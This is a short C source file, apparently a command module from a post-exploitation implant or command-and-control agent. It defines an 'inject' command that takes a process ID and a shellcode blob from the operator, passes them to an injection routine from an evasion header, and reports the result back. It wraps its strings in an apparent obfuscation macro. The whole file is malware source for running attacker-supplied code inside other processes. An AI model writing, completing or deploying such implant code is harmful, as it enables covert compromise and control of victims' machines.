#include "config.h"
#ifdef INCLUDE_CMD_INJECT

#include "commands.h"
#include "evasion/injection.h"

VOID cmd_inject(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD pid = parser_int32(args);
    DWORD sc_len = 0;
    BYTE* sc = parser_bytes(args, &sc_len);

    if (pid == 0 || !sc || sc_len == 0) {
        package_add_string(inst, response, XSTR("Usage: inject <pid> <shellcode>"));
        response->is_error = TRUE;
        return;
    }

    if (inject_shellcode(inst, pid, sc, sc_len)) {
        package_add_string(inst, response, XSTR("Shellcode injected"));
    } else {
        package_add_string(inst, response, XSTR("Injection failed"));
        response->is_error = TRUE;
    }
}

#endif
